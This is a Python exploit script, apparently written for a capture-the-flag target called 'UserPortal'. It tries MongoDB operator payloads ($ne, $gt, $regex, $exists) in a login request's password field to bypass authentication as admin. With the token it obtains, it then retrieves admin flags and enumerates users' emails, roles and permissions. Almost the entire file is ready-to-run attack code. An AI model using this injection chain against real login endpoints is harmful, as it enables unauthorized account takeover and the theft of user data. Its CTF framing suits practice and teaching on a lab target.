#!/usr/bin/env python3
import requests
import json
import sys
from urllib.parse import urljoin

class UserPortalExploit:
    def __init__(self, base_url="http://localhost:8092"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'UserPortal-Exploit/1.0'
        })
    
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    UserPortal CTF Exploit                   ║
║                  NoSQL Injection Attack                     ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def test_connection(self):
        """Test if the target is reachable"""
        try:
            response = self.session.get(self.base_url, timeout=5)
            if response.status_code == 200:
                print(f"[+] Target is reachable: {self.base_url}")
                return True
            else:
                print(f"[-] Target returned status code: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to connect to target: {e}")
            return False
    
    def nosql_injection_login(self, username="admin"):
        """
        Perform NoSQL injection to bypass authentication
        Uses MongoDB $ne (not equal) operator to bypass password check
        """
        print(f"\n[*] Attempting NoSQL injection login for user: {username}")
        
        # NoSQL injection payloads
        payloads = [
            {"$ne": None},          # Not equal to null
            {"$ne": ""},            # Not equal to empty string
            {"$gt": ""},            # Greater than empty string
            {"$regex": ".*"},       # Regex match anything
            {"$exists": True},      # Field exists
        ]
        
        login_url = urljoin(self.base_url, "/api/auth/login")
        
        for i, payload in enumerate(payloads, 1):
            print(f"[*] Trying payload {i}/{len(payloads)}: {payload}")
            
            login_data = {
                "username": username,
                "password": payload
            }
            
            try:
                response = self.session.post(login_url, json=login_data, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success'):
                        print(f"[+] SUCCESS! NoSQL injection worked with payload: {payload}")
                        print(f"[+] Obtained JWT token: {data.get('token', 'N/A')[:50]}...")
                        print(f"[+] User role: {data.get('user', {}).get('role', 'N/A')}")
                        return data.get('token'), data.get('user')
                    else:
                        print(f"[-] Login failed: {data.get('error', 'Unknown error')}")
                else:
                    print(f"[-] HTTP {response.status_code}: {response.text[:100]}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
        
        print("[-] All NoSQL injection attempts failed")
        return None, None
    
    def access_admin_flags(self, token):
        """Access the protected admin flags endpoint"""
        print(f"\n[*] Attempting to access admin flags with obtained token...")
        
        flags_url = urljoin(self.base_url, "/api/admin/flags")
        headers = {"Authorization": f"Bearer {token}"}
        
        try:
            response = self.session.get(flags_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                flags = data.get('flags', [])
                
                print(f"[+] SUCCESS! Retrieved {len(flags)} flag(s):")
                print("=" * 60)
                
                for flag in flags:
                    print(f"Flag Name: {flag.get('name', 'N/A')}")
                    print(f"Flag Value: {flag.get('value', 'N/A')}")
                    print(f"Description: {flag.get('description', 'N/A')}")
                    print(f"Category: {flag.get('category', 'N/A')}")
                    print(f"Points: {flag.get('points', 'N/A')}")
                    print("-" * 40)
                
                return flags
            else:
                print(f"[-] Failed to access flags: HTTP {response.status_code}")
                print(f"[-] Response: {response.text[:200]}")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None
    
    def enumerate_users(self, token):
        """Enumerate users using the obtained token"""
        print(f"\n[*] Enumerating users...")
        
        users_url = urljoin(self.base_url, "/api/users")
        headers = {"Authorization": f"Bearer {token}"}
        
        try:
            response = self.session.get(users_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                users = data.get('users', [])
                
                print(f"[+] Found {len(users)} users:")
                print("-" * 60)
                
                for user in users:
                    print(f"Username: {user.get('username', 'N/A')}")
                    print(f"Email: {user.get('email', 'N/A')}")
                    print(f"Role: {user.get('role', 'N/A')}")
                    print(f"Department: {user.get('profile', {}).get('department', 'N/A')}")
                    print(f"Permissions: {', '.join(user.get('permissions', []))}")
                    print("-" * 30)
                
                return users
            else:
                print(f"[-] Failed to enumerate users: HTTP {response.status_code}")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None
    
    def run_exploit(self):
        """Run the complete exploit chain"""
        self.print_banner()
        
        # Test connection
        if not self.test_connection():
            sys.exit(1)
        
        # Attempt NoSQL injection
        token, user = self.nosql_injection_login()
        
        if not token:
            print("\n[-] Exploit failed: Could not bypass authentication")
            sys.exit(1)
        
        print(f"\n[+] Authentication bypassed successfully!")
        print(f"[+] Logged in as: {user.get('username', 'N/A')} ({user.get('role', 'N/A')})")
        
        # Try to access admin flags
        flags = self.access_admin_flags(token)
        
        # Enumerate users for additional information
        users = self.enumerate_users(token)
        
        if flags:
            print(f"\n[+] EXPLOIT SUCCESSFUL!")
            print(f"[+] CTF Flag obtained: {flags[0].get('value', 'N/A')}")
        else:
            print(f"\n[!] Partial success: Authentication bypassed but couldn't access flags")
            print(f"[!] User may not have sufficient permissions")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='UserPortal NoSQL Injection Exploit')
    parser.add_argument('--url', default='http://localhost:8092', 
                       help='Target URL (default: http://localhost:8092)')
    parser.add_argument('--username', default='admin',
                       help='Username to target (default: admin)')
    
    args = parser.parse_args()
    
    exploit = UserPortalExploit(args.url)
    exploit.run_exploit()

if __name__ == "__main__":
    main()
